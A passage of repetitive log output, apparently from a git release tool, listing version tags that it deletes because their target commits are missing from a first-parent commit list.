\"83f83ea41e72eeddc58f70f1ec77435ea1739140\"\n>\tDeleting tag v1.7.10-beta.0 because kFirstParentCommits lacks target \"9e7b2a6b1195703a51a413701e84ebe37521df81\"\n>\tDeleting tag v1.4.9-beta.0 because kFirstParentCommits lacks target \"5aadd18b051c7c156ee9815055beb180c8365309\"\n>\tDeleting tag v1.5.6-beta.0 because kFirstParentCommits lacks target \"21f5c4d2561bec76d275959b98273c52af247acd\"\n>\tDeleting tag v1.6.11-beta.0 because kFirstParentCommits lacks target \"1d6ed8e3efaaade6dcec794b72c574522f2cfd10\"\n>\tDeleting tag v1.11.2-beta.0 because kFirstParentCommits lacks target \"9ead5ada0d797d4b5237d274644d0a09ebfc0b93\"\n>\tDeleting tag v1.12.0-beta.0 because kFirstParentCommits lacks target \"450ed5307355ef0e3d215f243b80178bd465c975\"\n>\tDeleting tag v1.2.6-beta.0 because kFirstParentCommits lacks target \"4996ab3b1cb116b906b23633d1796dc2954dd440\"\n>\tDeleting tag v1.3.8-beta.0 because kFirstParentCommits lacks target \"17d4cf1af43a03a5997ea9142b19e5b1ac2d8747\"\n>\tDeleting tag v0.5.2 because kFirstParentCommits lacks target \"97fce8bb4b70e74c2bcf1f5745da521faa77d580\"\n>\tDeleting tag v1.0.0 because kFirstParentCommits lacks target \"cd821444dcf3e1e237b5f3579721440624c9c4fa\"\n>\tDeleting tag v1.10.0-beta.1 because kFirstParentCommits lacks target \"37555e6d24c2f951c40660ea59a80fa251982005\"\n>\tDeleting tag v1.8.15-beta.0 because kFirstParentCommits lacks target \"4d470d6f7fdec0056c910e3d570485fe6e839894\"\n>\tDeleting tag v1.10.7-beta.0 because kFirstParentCommits lacks target \"75e0f58bf8db10f9e743ce5fab3016c0a2b1f715\"\n>\tDeleting tag v1.7.3 because kFirstParentCommits lacks target \"2c2fe6e8278a5db2d15a013987b53968c743f2a1\"\n>\tDeleting tag v1.4.0 because kFirstParentCommits lacks target \"a16c0a7f71a6f93c7e0f222d961f4675cd97a46b\"\n>\tDeleting tag v1.8.0-beta.0 because kFirstParentCommits lacks target \"86c94a3a8ee583782c85a1bb676fa22d138d4cec\"\n>\tDeleting tag v1.1.0 because kFirstParentCommits lacks target \"7d6c8b640f2e90cf2347fb46ef4cf46cd3280015\"\n>\tDeleting tag v1.8.5 because kFirstParentCommits lacks target \"cce11c6a185279d037023e02ac5249e14daa22bf\"\n>\tDeleting tag v1.4.1-beta.2 because kFirstParentCommits lacks target \"bd85192c2673153b3b470a2f158ddc840d295768\"\n>\tDeleting tag v1.3.5 because kFirstParentCommits lacks target \"b0deb2eb8f4037421077f77cb163dbb4c0a2a9f5\"\n>\tDeleting tag v1.7.0 because kFirstParentCommits lacks target \"d3ada0119e776222f11ec7945e6d860061339aad\"\n>\tDeleting tag v1.7.10 because kFirstParentCommits lacks target \"bebdeb749f1fa3da9e1312c4b08e439c404b3136\"\n>\tDeleting tag v1.0.5 because kFirstParentCommits lacks target \"843c2c5d65278d57d138ff689b7de5151f058570\"\n>\tDeleting tag v1.4.6 because kFirstParentCommits lacks target \"e569a27d02001e343cb68086bc06d47804f62af6\"\n>\tDeleting tag v0.7.2 because kFirstParentCommits lacks target \"0d6131bbcd6682d0e51eefc0e439e5dcbbf511b1\"\n>\tDeleting tag v1.4.4-beta.0 because kFirstParentCommits lacks target \"77bdb7f343d9feade94c17a2f25fef71cd0a92d7\"\n>\tDeleting tag v1.8.2-beta.0 because kFirstParentCommits lacks target \"cbf4052669cc280713a97f8802998250f37c31f0\"\n>\tDeleting tag v1.4.1-beta.0 because kFirstParentCommits lacks target \"23b426563780c64ac25df63a2d141247d02aac7a\"\n>\tDeleting tag v1.7.11 because kFirstParentCommits lacks target \"b13f2fd682d56eab7a6a2b5a1cab1a3d2c8bdd55\"\n>\tDeleting tag v1.1.7-beta.0 because kFirstParentCommits lacks target \"dcab4ce0acca599b1a4413a5b00d4fc09b683476\"\n>\tDeleting tag v0.13.2 because kFirstParentCommits lacks target \"ce491e7d1529d89cd3c43d79b803e4d65192d09a\"\n>\tDeleting tag v0.15.0 because kFirstParentCommits lacks target \"831f3e60d7cd64c61a775d6c78acce1673dd8aa9\"\n>\tDeleting tag v1.3.5-beta.0 because kFirstParentCommits lacks target \"a0bfee0d3899d2b91530552a536405c1fe1a1d2a\"\n>\tDeleting tag v1.6.6 because kFirstParentCommits lacks target \"7fa1c1756d8bc963f1a389f4a6937dc71f08ada2\"\n>\tDeleting tag v1.1.8-beta.0 because kFirstParentCommits lacks target \"4309194eda6bfd4db0cc28f46cacabe1719979d7\"\n>\tDeleting tag v1.2.4 because kFirstParentCommits lacks target \"3eed1e3be6848b877ff80a93da3785d9034d0a4f\"\n>\tDeleting tag v1.4.3 because kFirstParentCommits lacks target \"4957b090e9a4f6a68b4a40375408fdc74a212260\"\n>\tDeleting tag v1.8.8 because kFirstParentCommits lacks target \"2f73858c9e6ede659d6828fe5a1862a48034a0fd\"\n>\tDeleting tag v1.4.2 because kFirstParentCommits lacks target \"c072cc2ee4dfc21b60196e5994c56c40e1c29b93\"\n>\tDeleting tag v1.8.14-beta.0 because kFirstParentCommits lacks target \"6acdd441b7689ae6cc0b057288f276d459e94f19\"\n>\tDeleting tag v1.6.0-beta.1 because kFirstParentCommits lacks target \"23cded36d1d20a538f97e0da05c1d2b62a6be700\"\n>\tDeleting tag v1.8.9-beta.0 because kFirstParentCommits lacks target \"5722a8ab9d1dfd873914a4ffc5dcb790ad961f87\"\n>\tDeleting tag v1.0.3 because kFirstParentCommits lacks target \"61c6ac5f350253a4dc002aee97b7db7ff01ee4ca\"\n>\tDeleting tag v1.2.2 because kFirstParentCommits lacks target \"528f879e7d3790ea4287687ef0ab3f2a01cc2718\"\n>\tDeleting tag v1.4.0-beta.2 because kFirstParentCommits lacks target \"9c9daa389e30e762fbbd46d68226fedc890149f9\"\n>\tDeleting tag v1.5.5 because kFirstParentCommits lacks target \"894ff23729bbc0055907dd3a496afb725396adda\"\n>\tDeleting tag v1.8.0-rc.1 because kFirstParentCommits lacks target \"c8a2429cb355d357d90174d3744a930dbd0bbff6\"\n>\tDeleting tag v0.7.4 because kFirstParentCommits lacks target \"b86c729de2ee66242a38730c7f0910db7aa7bab8\"\n>\tDeleting tag v1.3.1-beta.1 because kFirstParentCommits lacks target \"1b854806c6ed2841f41896dc87268b599d180d8b\"\n>\tDeleting tag v0.14.2 because kFirstParentCommits lacks target \"3ffb6193b5152fc3a2e2a4a12111130f4b531110\"\n>\tDeleting tag v1.11.1-beta.0 because kFirstParentCommits lacks target \"395200531414cf49c0b1d139bcde74ec2c7ded55\"\n>\tDeleting tag v1.2.1-beta.0 because kFirstParentCommits lacks target \"fd557a2c9f47c655f9c07d9cf9dee2539e935703\"\n>\tDeleting tag v1.8.16-beta.0 because kFirstParentCommits lacks target \"a758e266dc23d4bdfb7ba56dfd7a3babf4d86e8a\"\n>\tDeleting tag v1.11.0-alpha.0 because kFirstParentCommits lacks target \"79b15896576b7cd8f40d952f5e8307d29a21ac28\"\n>\tDeleting tag v1.7.0-beta.1 because kFirstParentCommits lacks target \"dfaba882698e26a47fb769be45fe5c048a9fe4ad\"\n>\tDeleting tag v0.8.0 because kFirstParentCommits lacks target \"2b47f5482ca60fa111c31c973eaa7b0349260305\"\n>\tDeleting tag v1.5.7-beta.0 because kFirstParentCommits lacks target \"ea8f6637b639246faa14a8d5c6f864100fcb77a9\"\n>\tDeleting tag v1.6.13 because kFirstParentCommits lacks target \"14ea65f53cdae4a5657cf38cfc8d7349b75b5512\"\n>\tDeleting tag v1.1.5-beta.0 because kFirstParentCommits lacks target \"e8fdbb77ef7d92b519b15d357fd3bfac55e01e01\"\n>\tDeleting tag v1.1.9-beta.0 because kFirstParentCommits lacks target \"596055084fbaef446983b14097f832f60ae57634\"\n>\tDeleting tag v1.4.0-beta.6 because kFirstParentCommits lacks target \"a77bafdcb39e7a854f22ab73136ab7f0907293c0\"\n>\tDeleting tag v1.4.8-beta.0 because kFirstParentCommits lacks target \"ba5b2fcee9d938dae74d4474f68d9d0933f3ec04\"\n>\tDeleting tag v1.5.2 because kFirstParentCommits lacks target \"08e099554f3c31f6e6f07b448ab3ed78d0520507\"\n>\tDeleting tag v0.19.2 because kFirstParentCommits lacks target \"c3331c4f34130054c329461ba471b61454796f53\"\n>\tDeleting tag v1.5.5-beta.0 because kFirstParentCommits lacks target \"00a1fb254bd8e5235575fba1398b958943e39078\"\n>\tDeleting tag v1.8.7 because kFirstParentCommits lacks target \"b30876a5539f09684ff9fde266fda10b37738c9c\"\n>\tDeleting tag v0.8.4 because kFirstParentCommits lacks target \"b3bf0f1304b28f9ecef6334df1dbfabde258e8ca\"\n>\tDeleting tag v1.10.0 because kFirstParentCommits lacks target \"fc32d2f3698e36b93322a3465f63a14e9f0eaead\"\n>\tDeleting tag v1.4.7-beta.0 because kFirstParentCommits lacks target \"fd8fac83034df346529c6e11aabceea2db48d663\"\n>\tDeleting tag v1.6.5 because kFirstParentCommits lacks target \"490c6f13df1cb6612e0993c4c14f2ff90f8cdbf3\"\n>\tDeleting tag v0.11.0 because kFirstParentCommits lacks target \"18ddff0eb6bc069b41832ce47d19b5b89cfb26e3\"\n>\tDeleting tag v1.0.2 because kFirstParentCommits lacks target \"e310e619fc1ac4f3238bf5ebe9e7033bf5d47ee2\"\n>\tDeleting tag v1.1.3-beta.0 because kFirstParentCommits lacks target \"d5e7fd774674a002474938bfdaa3481b5e12c385\"\n>\tDeleting tag v1.2.5-beta.0 because kFirstParentCommits lacks target \"3d6adabd365ed5f81a2a3b843c63626c27e4034d\"\n>\tDeleting tag v0.21.1 because kFirstParentCommits lacks target \"906122a279abbfa7f54e8dbf3ea06aac3bf89fac\"\n>\tDeleting tag v1.12.0-beta.1 because kFirstParentCommits lacks target \"553515b823634919e731774556fae554c95a6a5f\"\n>\tDeleting tag v1.4.7 because kFirstParentCommits lacks target \"92b4f971662de9d8770f8dcd2ee01ec226a6f6c0\"\n>\tDeleting tag v0.4.3 because kFirstParentCommits lacks target \"7c1f83e71b2238f4656e56365edc49e87ef25a3b\"\n>\tDeleting tag v1.10.4 because kFirstParentCommits lacks target \"5ca598b4ba5abb89bb773071ce452e33fb66339d\"\n>\tDeleting tag v1.5.7 because kFirstParentCommits lacks target \"8eb75a5810cba92ccad845ca360cf924f2385881\"\n>\tDeleting tag v1.2.5 because kFirstParentCommits lacks target \"25eb53b54e08877d3789455964b3e97bdd3f3bce\"\n>\tDeleting tag v1.5.2-beta.0 because kFirstParentCommits lacks target \"5f332aab13e58173f85fd204a2c77731f7a2573f\"\n>\tDeleting tag v0.14.1 because kFirstParentCommits lacks target \"77775a61b8e908acf6a0b08671ec1c53a3bc7fd2\"\n>\tDeleting tag v1.3.2-beta.0 because kFirstParentCommits lacks target \"4e6ee9200183d6bd50061c2ae4270542cbb292c2\"\n>\tDeleting tag v1.6.2-beta.0 because kFirstParentCommits lacks target \"aaf9ea07f519a2c3f4769dc8d10b807ad1a8d279\"\n>\tDeleting tag v1.3.0-beta.1 because kFirstParentCommits lacks target \"1c7855093eb999c8f3cedb19d3467cd7b691e35e\"\n>\tDeleting tag v0.19.3 because kFirstParentCommits lacks target \"3103c8ca0f24514bc39b6e2b7d909bbf46af8d11\"\n>\tDeleting tag v1.3.6 because kFirstParentCommits lacks target \"ae4550cc9c89a593bcda6678df201db1b208133b\"\n>\tDeleting tag v1.0.8-beta because kFirstParentCommits lacks target \"6234d6a0abd3323cd08c52602e4a91e47fc9491c\"\n>\tDeleting tag v1.11.0-rc.3 because kFirstParentCommits lacks target \"931fc3b3aef9d679436978529fc7065d75352671\"\n>\tDeleting tag v1.7.14 because kFirstParentCommits lacks target \"d1303b003001cf2b5b8cec099383125096b3dac0\"\n>\tDeleting tag v1.4.0-beta.1 because kFirstParentCommits lacks target \"f7b03a3287b5a2c47cd7fad379b48df01036ce34\"\n>\tDeleting tag v1.6.14-beta.0 because kFirstParentCommits lacks target \"1cd671df0e4ab3465520d16e8839bc6d91edf91d\"\n>\tDeleting tag v1.6.7-beta.0 because kFirstParentCommits lacks target \"7c3906a4eccd5a7cad245de0bd65337927a60bef\"\n>\tDeleting tag v1.7.2 because kFirstParentCommits lacks target \"922a86cfcd65915a9b2f69f3f193b8907d741d9c\"\n>\tDeleting tag v1.1.6 because kFirstParentCommits lacks target \"4b96d7979604819dbb4d82cd3bbe58b6d622a575\"\n>\tDeleting tag v1.4.12 because kFirstParentCommits lacks target \"19e81afecf5eb2b7838c35e2cbf776aff04dc34c\"\n>\tDeleting tag v1.7.7-beta.0 because kFirstParentCommits lacks target \"d3faa3f8f2e85c8089e80a661955626ae24abf80\"\n>\tDeleting tag v0.8.2 because kFirstParentCommits lacks target \"5b046406a957a1e7eda7c0c86dd7a89e9c94fc5f\"\n>\tDeleting tag v1.10.0-beta.2 because kFirstParentCommits lacks target \"63dad40a0391b7af32c34fdbf41fa199c3b247ad\"\n>\tDeleting tag v1.5.0-beta.0 because kFirstParentCommits lacks target \"82c2538cf7541383a3d203e1d850331a507bc80c\"\n>\tDeleting tag v1.8.2 because kFirstParentCommits lacks target \"bdaeafa71f6c7c04636251031f93464384d54963\"\n>\tDeleting tag v1.2.0-alpha.0 because kFirstParentCommits lacks target \"5c02e7f123a3f5f0b271fb811cf0245a660e9536\"\n>\tDeleting tag v1.7.13 because kFirstParentCommits lacks target \"7e4c2dfb27000d69cd43d3a78ece76d5564687be\"\n>\tDeleting tag v1.2.4-beta.0 because kFirstParentCommits lacks target \"b14ae23f32077d8911f88bc47ab15842fb93b339\"\n>\tDeleting tag v1.4.0-beta.4 because kFirstParentCommits lacks target \"6e6504598e756e66e3c263bc9942ee45864033c2\"\n>\tDeleting tag v1.10.4-beta.0 because kFirstParentCommits lacks target \"b6ebf99a2198db0473dca281401fa77e386a63bc\"\n>\tDeleting tag v1.7.14-beta.0 because kFirstParentCommits lacks target \"9f1741ef9dc5149d518c3518054dc229693a3d6e\"\n>\tDeleting tag v1.10.0-alpha.2 because kFirstParentCommits lacks target \"175df0cba07e17a5b60a59fed1b4477187026781\"\n>\tDeleting tag v1.11.3-beta.0 because kFirstParentCommits lacks target \"7abbb2db1b31540e68e6dc9e126b57c9eae8d1fd\"\n>\tDeleting tag v1.8.10 because kFirstParentCommits lacks target \"044cd262c40234014f01b40ed7b9d09adbafe9b1\"\n>\tDeleting tag v1.8.13 because kFirstParentCommits lacks target \"290fb182489a396dce5d136451388f9b12f29c94\"\n>\tDeleting tag v1.10.5-beta.0 because kFirstParentCommits lacks target \"17538dc72bd07c34c0d15d93bf0c025fdddd92a9\"\n>\tDeleting tag v1.4.1 because kFirstParentCommits lacks target \"33cf7b9acbb2cb7c9c72a10d6636321fb180b159\"\n>\tDeleting tag v0.5.1 because kFirstParentCommits lacks target \"3c409cdf2636ff225682d8f3aaff44fbfa5abb21\"\n>\tDeleting tag v1.4.0-beta.9 because kFirstParentCommits lacks target \"dfce7e639b341a13a1b6c8c1c52517949772b650\"\n>\tDeleting tag v1.7.1-beta.0 because kFirstParentCommits lacks target \"ebb8d6e0fadfc95f3d64ccecc36c8ed2ac9224ef\"\n>\tDeleting tag v1.1.1 because kFirstParentCommits lacks target \"92635e23dfafb2ddc828c8ac6c03c7a7205a84d8\"\n>\tDeleting tag v1.3.3-beta.0 because kFirstParentCommits lacks target \"b983cc0fcfeb337157038b418bbc37774af1df94\"\n>\tDeleting tag v1.7.16 because kFirstParentCommits lacks target \"e8846c1d7e7e632d4bd5ed46160eff3dc4c993c5\"\n>\tDeleting tag v1.7.7 because kFirstParentCommits lacks target \"8e1552342355496b62754e61ad5f802a0f3f1fa7\"\n>\tDeleting tag v1.4.5 because kFirstParentCommits lacks target \"5a0a696437ad35c133c0c8493f7e9d22b0f9b81b\"\n>\tDeleting tag v1.5.3-beta.0 because kFirstParentCommits lacks target \"b5f9d56cab78ccaad2b726223ba8be5802026f0b\"\n>\tDeleting tag v1.5.6 because kFirstParentCommits lacks target \"114f8911f9597be669a747ab72787e0bd74c9359\"\n>\tDeleting tag v1.7.5-beta.0 because kFirstParentCommits lacks target \"d090cd0e2bf432034b42de5d098d999bc99de043\"\n>\tDeleting tag v0.7.3 because kFirstParentCommits lacks target \"c7bf0b19999feb3f326151aa88def9bbc0a865c8\"\n>\tDeleting tag v1.11.0-beta.1 because kFirstParentCommits lacks target \"4e3b2843df571c3b80c834d7c23bc6da1a22aab8\"\n>\tDeleting tag v1.3.2 because kFirstParentCommits lacks target \"9bafa3400a77c14ee50782bb05f9efc5c91b3185\"\n>\tDeleting tag v0.6.1 because kFirstParentCommits lacks target \"6351efc43db8702072bfd31f3e0af9ea444115ac\"\n>\tDeleting tag v1.1.8 because kFirstParentCommits lacks target \"a8af33dc07ee08defa2d503f81e7deea32dd1d3b\"\n>\tDeleting tag v1.6.10 because kFirstParentCommits lacks target \"6c7eb1f61f963295b53a1d86f488ec1a54da7523\"\n>\tDeleting tag v1.7.13-beta.0 because kFirstParentCommits lacks target \"dc929bb842500f4940d7555e712d7319924e8434\"\n>\tDeleting tag v1.11.2 because kFirstParentCommits lacks target \"bb9ffb1654d4a729bb4cec18ff088eacc153c239\"\n>\tDeleting tag v1.6.0-beta.3 because kFirstParentCommits lacks target \"0cd5ed469508e6dfc807ee6681561c845828917e\"\n>\tDeleting tag v1.6.4-beta.0 because kFirstParentCommits lacks target \"1f83569cf3e3ae818893998da9d8d516f19b782c\"\n>\tDeleting tag v1.11.0-alpha.2 because kFirstParentCommits lacks target \"ed9b25c90241b2b8a1fa10b96381c57f99ca952a\"\n>\tDeleting tag v1.4.0-beta.11 because kFirstParentCommits lacks target \"4b28af1232cc52da453eb4ebe3dc001314a1f99b\"\n>\tDeleting tag v1.6.11 because kFirstParentCommits lacks target \"398c13def6f08d6476f686e6b01ea810f7d4ead5\"\n>\tDeleting tag v1.7.5 because kFirstParentCommits lacks target \"17d7182a7ccbb167074be7a87f0a68bd00d58d97\"\n>\tDeleting tag v1.2.0 because kFirstParentCommits lacks target \"5cb86ee022267586db386f62781338b0483733b3\"\n>\tDeleting tag v1.3.4-beta.0 because kFirstParentCommits lacks target \"e7f022c926583ed8e755a52f23abc4cf8b532d12\"\n>\tDeleting tag v1.4.5-beta.0 because kFirstParentCommits lacks target \"1bed5bb1a72be482ea507da3057b689d5a3034f1\"\n>\tDeleting tag v1.6.0-beta.4 because kFirstParentCommits lacks target \"b202120be3a97e5f8a5e20da51d0b6f5a1eebd31\"\n>\tDeleting tag v1.6.9-beta.0 because kFirstParentCommits lacks target \"67b88532642baccc341a2a086de10fe16cf59a60\"\n>\tDeleting tag v0.5.6 because kFirstParentCommits lacks target \"55fa22c3236317154208119b3d2e0cfbfde59efc\"\n>\tDeleting tag v1.5.1-beta.0 because kFirstParentCommits lacks target \"d47846323632bf59c729460fc7344d2df347bf46\"\n>\tDeleting tag v1.6.3-beta.1 because kFirstParentCommits lacks target \"7fc0617cf892e6d89de9b39ee151be98e52e4843\"\n>\tDeleting tag v1.10.3 because kFirstParentCommits lacks target \"2bba0127d85d5a46ab4b778548be28623b32d0b0\"\n>\tDeleting tag v1.10.7 because kFirstParentCommits lacks target \"0c38c362511b20a098d7cd855f1314dad92c2780\"\n>\tDeleting tag v1.7.4 because kFirstParentCommits lacks target \"793658f2d7ca7f064d2bdf606519f9fe1229c381\"\n>\tDeleting tag v1.10.0-alpha.1 because kFirstParentCommits lacks target \"4956e65d5926c02840cc0854d423ac31af29065f\"\n>\tDeleting tag v0.3 because kFirstParentCommits lacks target \"89eff1d0d88d62b5b34512a162a3affb513479e5\"\n>\tDeleting tag v1.11.1 because kFirstParentCommits lacks target \"b1b29978270dc22fecc592ac55d903350454310a\"\n>\tDeleting tag v1.4.0-beta.8 because kFirstParentCommits lacks target \"3040f87c570a772ce94349b379f41f329494a4f7\"\n>\tDeleting tag v1.6.0-beta.2 because kFirstParentCommits lacks target \"8af9c3e53bc2c508d9948cb511372057339656f1\"\n>\tDeleting tag v1.6.12-beta.0 because kFirstParentCommits lacks target \"2f830d21be89a077189f60a2d0b8379b7e2ba533\"\n>\tDeleting tag v1.6.6-beta.0 because kFirstParentCommits lacks target \"b90e25a03b263752154c68fc3c09ef9921cf1dae\"\n>\tDeleting tag v0.13.0 because kFirstParentCommits lacks target \"8d8b9b9a782a9079e6d91ba0e81d4c10e8445941\"\n>\tDeleting tag v1.10.0-rc.1 because kFirstParentCommits lacks target \"2106a5910f6de3c07b8f329c7adaca38a0d3f825\"\n>\tDeleting tag v1.8.11 because kFirstParentCommits lacks target \"1df6a8381669a6c753f79cb31ca2e3d57ee7c8a3\"\n>\tDeleting tag v1.5.1 because kFirstParentCommits lacks target \"82450d03cb057bab0950214ef122b67c83fb11df\"\n>\tDeleting tag v1.5.8 because kFirstParentCommits lacks target \"e8c167a115ec662726904265d17f75a6d79d78d8\"\n>\tDeleting tag v1.12.0-alpha.0 because kFirstParentCommits lacks target \"03d97e0f8fc73d4fc89561d940259cf443b3ac7b\"\n>\tDeleting tag v1.4.0-beta.10 because kFirstParentCommits lacks target \"3aa6d31d3a213ba04b3252cc123ddef26d44cd0e\"\n>\tDeleting tag v0.16.0 because kFirstParentCommits lacks target \"2cea8f22b38b3f7da9a5a018713f69103ed2689f\"\n>\tDeleting tag v0.19.1 because kFirstParentCommits lacks target \"bb63f031d4146c17113b059886aea66b09f6daf5\"\n>\tDeleting tag v1.4.8 because kFirstParentCommits lacks target \"c5fcb1951afb8150e4574bc234aed957cb586eb0\"\n>\tDeleting tag v1.7.9 because kFirstParentCommits lacks target \"7f63532e4ff4fbc7cacd96f6a95b50a49a2dc41b\"\n>\tDeleting tag v1.8.6 because kFirstParentCommits lacks target \"6260bb08c46c31eea6cb538b34a9ceb3e406689c\"\n>\tDeleting tag v1.8.4-beta.0 because kFirstParentCommits lacks target \"89ffe7ab5ddbad9359fbe7d24f2b72c6ee59ee5d\"\n>\tDeleting tag v0.20.2 because kFirstParentCommits lacks target \"323fde5bc5c45e30bbb5451ccf5c1ff01b0717f7\"\n>\tDeleting tag v1.6.5-beta.0 because kFirstParentCommits lacks target \"00fb653e406a4b5bbac71a10c3e330afef960f13\"\n>\tDeleting tag v1.1.6-beta.0 because kFirstParentCommits lacks target \"f7636d888c1b61158761d1e9a7b8c3f4a12305f3\"\n>\tDeleting tag v1.2.8-beta.0 because kFirstParentCommits lacks target \"5efd74fa52f4bf7ea27d4c1ec49a97b1090994ef\"\n>\tDeleting tag v1.6.0-beta.0 because kFirstParentCommits lacks target \"609565b477c2b0059a01cb4a7ac538f80a469fb9\"\n>\tDeleting tag v1.8.4 because kFirstParentCommits lacks target \"9befc2b8928a9426501d3bf62f72849d5cbcd5a3\"\n>\tDeleting tag v0.12.1 because kFirstParentCommits lacks target \"7a98dc0145574f79409f6051b2b1fe8da9d2df47\"\n>\tDeleting tag v1.6.10-beta.0 because kFirstParentCommits lacks target \"e484b37cb2476c5a61d1ced880e943b07feb007d\"\n>\tDeleting tag v1.0.1 because kFirstParentCommits lacks target \"6a5c06e3d1eb27a6310a09270e4a5fb1afa93e74\"\n>\tDeleting tag v1.1.2 because kFirstParentCommits lacks target \"3085895b8a70a3d985e9320a098e74f545546171\"\n>\tDeleting tag v0.8.1 because kFirstParentCommits lacks target \"a137096158b3aa55f4e8e1140140d14e7cb68e7e\"\n>\tDeleting tag v1.3.11-beta.0 because kFirstParentCommits lacks target \"759dd0dfb826658c78db42d97b77b9594cd43333\"\n>\tDeleting tag v1.7.3-beta.0 because kFirstParentCommits lacks target \"84dfa6a4e3c655bb3cf63756d1674dff1976fe06\"\n>\tDeleting tag v0.10.0 because kFirstParentCommits lacks target \"71e26cbeb9c0bf1b6cc4c29b1f9d930e53513911\"\n>\tDeleting tag v1.11.0-rc.1 because kFirstParentCommits lacks target \"8745ea56e3f1f3ad20050c1762eb6ba6f7786675\"\n>\tDeleting tag v1.7.1 because kFirstParentCommits lacks target \"1dc5c66f5dd61da08412a74221ecc79208c2165b\"\n>\tDeleting tag v1.8.9 because kFirstParentCommits lacks target \"3fb1aafdafa3d33bc698930095db1e56c0f76452\"\n>\tDeleting tag v1.3.1-beta.0 because kFirstParentCommits lacks target \"a639d02cbff6f21e89eb639c7b7e5ad268bd4c29\"\n>\tDeleting tag v0.4 because kFirstParentCommits lacks target \"4452163ffde9dc58382f313b724ddf3bad8ea13f\"\n>\tDeleting tag v1.3.0-beta.2 because kFirstParentCommits lacks target \"caf9a4d87700ba034a7b39cced19bd5628ca6aa3\"\n>\tDeleting tag v1.10.8-beta.0 because kFirstParentCommits lacks target \"df3ab68a478d6e4d29c9e257159cce1a07e3c643\"\n>\tDeleting tag v1.3.4 because kFirstParentCommits lacks target \"dd6b458ef8dbf24aff55795baa68f83383c9b3a9\"\n>\tDeleting tag v1.5.8-beta.0 because kFirstParentCommits lacks target \"f07eea23494be1e7c11a8e2cf51bd96d1ec9fdf1\"\n>\tDeleting tag v1.8.3 because kFirstParentCommits lacks target \"f0efb3cb883751c5ffdbe6d515f3cb4fbe7b7acd\"\n>\tDeleting tag v1.1.1-beta.1 because kFirstParentCommits lacks target \"d3071cbd760a8f8650ff379398c59e71ffcf7085\"\n>\tDeleting tag v1.2.6 because kFirstParentCommits lacks target \"6776d72256b8c3ca8e0c3e457fc58889f2202a3e\"\n>\tDeleting tag v1.3.8 because kFirstParentCommits lacks target \"693ef591120267007be359f97191a6253e0e4fb5\"\n>\tDeleting tag v0.5.4 because kFirstParentCommits lacks target \"a589f85a45d33cabb5562b84d6633815f8c3579b\"\n>\tDeleting tag v1.11.0-rc.2 because kFirstParentCommits lacks target \"d0a17cb4bbdf608559f257a76acfaa9acb054903\"\n>\tDeleting tag v1.3.10-beta.0 because kFirstParentCommits lacks target \"22b167b166e60b5634429cc42f16ad40a6c15e52\"\n>\tDeleting tag v1.7.11-beta.0 because kFirstParentCommits lacks target \"3639f375633d581271e91783b4592d455bd29aeb\"\n>\tDeleting tag v1.8.6-beta.0 because kFirstParentCommits lacks target \"a54776dcd19445353d7f9516a498f1e9e3ef708c\"\n>\tDeleting tag v1.1.0-beta because kFirstParentCommits lacks target \"7d6c8b640f2e90cf2347fb46ef4cf46cd3280015\"\n>\tDeleting tag v1.1.2-beta.0 because kFirstParentCommits lacks target \"e2b05d6b2a66f4fa55ca51baa6e11713ab0407be\"\n>\tDeleting tag v1.11.0-alpha.1 because kFirstParentCommits lacks target \"4761788b2afa42a4573a6794902eb93fe666d5c5\"\n>\tDeleting tag v1.4.9 because kFirstParentCommits lacks target \"844ef259fa9ec2228d8b5ef5a211da4fa9a5fae4\"\n>\tDeleting tag v0.18.2 because kFirstParentCommits lacks target \"1f12b893876ad6c41396222693e37061f6e80fe1\"\n>\tDeleting tag v1.2.7-beta.0 because kFirstParentCommits lacks target \"e7503fde8ec6b3911dc7e22cae2619dc5bcec351\"\n>\tDeleting tag v1.6.3 because kFirstParentCommits lacks target \"0480917b552be33e2dba47386e51decb1a211df6\"\n>\tDeleting tag v1.6.4 because kFirstParentCommits lacks target \"d6f433224538d4f9ca2f7ae19b252e6fcb66a3ae\"\n>\tDeleting tag v0.12.2 because kFirstParentCommits lacks target \"e7aa07fd75c9efa68f25abe4c5b735681cfac6c5\"\n>\tDeleting tag v0.20.0 because kFirstParentCommits lacks target \"c17a15a0cbcac20230c6d63a584958422c5fd9ec\"\n>\tDeleting tag v1.6.1-beta.0 because kFirstParentCommits lacks target \"8d26223577ea3c9ad94c6e858a6ec43ef8927a9c\"\n>\tDeleting tag v0.7.1 because kFirstParentCommits lacks target \"57779efb8d52c2650d96b8399172f968a0dd71c1\"\n>\tDeleting tag v1.11.0-beta.0 because kFirstParentCommits lacks target \"c3c52634ebd2a1534c0506484f611a43f1f0a8bf\"\n>\tDeleting tag v1.8.0-beta.1 because kFirstParentCommits lacks target \"8c025bc2f23a3be059bf9a7d05867a8cb6f52ea8\"\n>\tDeleting tag v0.13.1 because kFirstParentCommits lacks target \"aaf75fa121d2db8f230fad0212fcfa5741443f12\"\n>\tDeleting tag v1.0.4 because kFirstParentCommits lacks target \"65d28d5fd12345592405714c81cd03b9c41d41d9\"\n>\tDeleting tag v1.4.0-beta.5 because kFirstParentCommits lacks target \"90f8457d7887249e0eac7e9f936b70ed40a4f154\"\n>\tDeleting tag v1.6.4-beta.1 because kFirstParentCommits lacks target \"310c79ee536163e5fa1771bcef0d03f8a517af8c\"\n>\tDeleting tag v1.6.8-beta.0 because kFirstParentCommits lacks target \"313fd317f96265658831a576fafdd6ed85aaf428\"\n>\tDeleting tag v1.7.0-beta.2 because kFirstParentCommits lacks target \"ceab7f7a6753c20d3be75463b17402fdcea856ba\"\n>\tDeleting tag v1.7.15-beta.0 because kFirstParentCommits lacks target \"91ad850d0165f8262fe71e07fa0da4707c05d846\"\n>\tDeleting tag v1.4.0-beta.3 because kFirstParentCommits lacks target \"a0a9a282b431f437b048932eaf01631408b5bae0\"\n>\tDeleting tag v1.7.16-beta.0 because kFirstParentCommits lacks target \"9da2a289034f30b21e48557b173cc9a3ab291b48\"\n>\tDeleting tag v1.7.8 because kFirstParentCommits lacks target \"bc6162cc70b4a39a7f39391564e0dd0be60b39e9\"\n>\tDeleting tag v1.8.12 because kFirstParentCommits lacks target \"5d26aba6949f188fde1af4875661e038f538f2c6\"\n>\tDeleting tag v0.10.1 because kFirstParentCommits lacks target \"c8b6b067dc784a729c1b42da050c8a9e69fc920b\"\n>\tDeleting tag v0.6.2 because kFirstParentCommits lacks target \"729fde276613eedcd99ecf5b93f095b8deb64eb4\"\n>\tDeleting tag v1.5.0-beta.1 because kFirstParentCommits lacks target \"8c6525e891be1c44cbdd6fcf53097a3adb11d68c\"\n>\tDeleting tag v1.6.1 because kFirstParentCommits lacks target 